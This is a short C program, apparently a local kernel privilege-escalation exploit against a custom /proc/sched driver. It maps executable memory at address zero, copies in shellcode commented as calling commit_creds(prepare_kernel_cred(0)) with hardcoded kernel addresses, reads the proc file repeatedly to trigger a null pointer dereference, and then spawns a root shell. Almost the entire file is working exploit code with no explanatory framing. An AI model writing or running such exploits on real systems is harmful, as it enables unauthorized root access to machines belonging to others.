#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <string.h>

int main()
{
	// maps shellcode to address 0 for when null pointer is derefernced
	char* m = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	// commit_creds(prepare_kernel_cred(0))
	char sc[] = {0x31, 0xff, 0x48, 0xc7, 0xc2, 0x50, 0xf8, 0x04, 0x81, 0xff, 0xd2, 0x48, 0x89, 0xc7, 0x48, 0xc7, 0xc2, 0x20, 0xf5, 0x04, 0x81, 0xff, 0xd2, 0xc3};
	// copy shellcode into the mmap'd memory
	memcpy(m, sc, sizeof(sc));
	int fd = open("/proc/sched", O_RDWR);
	char b;
	//write(fd, "0.0.0", 3); //add to queue
	for(int i=1; i<=6; i++){
		printf("%d\n", i);
		read(fd, &b, 1); //pop off queue
	}
	// trigger null pointer dereference 
	system("/bin/sh");
	return 0;
}
